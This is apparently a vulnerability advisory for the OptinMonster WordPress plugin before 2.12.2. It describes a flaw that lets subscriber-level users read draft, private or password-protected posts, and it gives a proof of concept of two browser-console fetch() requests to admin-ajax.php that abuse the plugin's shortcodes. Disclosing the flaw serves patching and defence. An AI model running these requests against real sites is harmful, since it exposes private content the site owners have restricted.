## WordPress Plugin Vulnerabilities

# Popup Builder by OptinMonster < 2.12.2 - Subscriber+ Arbitrary Post Content Disclosure

### Description

The plugin does not ensure that the campaign to be loaded via some shortcodes is actually a campaign, allowing any authenticated users such as subscriber to retrieve the content of arbitrary posts, like draft, private or even password protected ones.

### Proof of Concept

Run one of the below commands in the developer console of the web browser while being on the blog as a subscriber
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": "action=parse-media-shortcode&shortcode=[optin-monster id='14']",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": "action=parse-media-shortcode&shortcode=[optin-monster-shortcode id='14']",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
This will display the content of the post with ID 14 (such as a draft/private/password protected one)
